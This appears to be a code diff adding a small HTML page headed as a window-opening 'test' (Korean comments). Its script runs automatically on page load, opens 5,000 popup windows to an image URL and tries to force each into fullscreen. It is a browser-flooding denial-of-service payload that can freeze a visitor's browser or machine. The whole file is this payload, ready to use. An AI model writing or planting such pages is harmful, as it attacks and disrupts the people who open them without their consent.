@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Massive Windows with Fullscreen</title>
+  <script>
+    function openWindows() {
+      const targetURL = "https://i.namu.wiki/i/2wT0VKuqpZFb7KtizqkNttjtLKyXE1M0INkVh46Vg12akKbOQdIG6MET3G3JqtU-DxnMlP8nJihCMOhbYvP_Lw.webp"; // 원하는 사이트 URL로 변경
+      for (let i = 0; i < 5000; i++) {
+        const newWindow = window.open(targetURL, "_blank", "width=800,height=600");
+
+        if (newWindow) {
+          // 새 창에서 전체화면 시도
+          try {
+            newWindow.document.addEventListener("DOMContentLoaded", () => {
+              newWindow.document.documentElement.requestFullscreen();
+            });
+          } catch (error) {
+            console.log("Fullscreen failed for window:", i + 1);
+          }
+        }
+      }
+    }
+
+    // 페이지 로드 시 실행
+    window.onload = openWindows;
+  </script>
+</head>
+<body>
+  <h1>창 열기 테스트</h1>
+</body>
+</html>
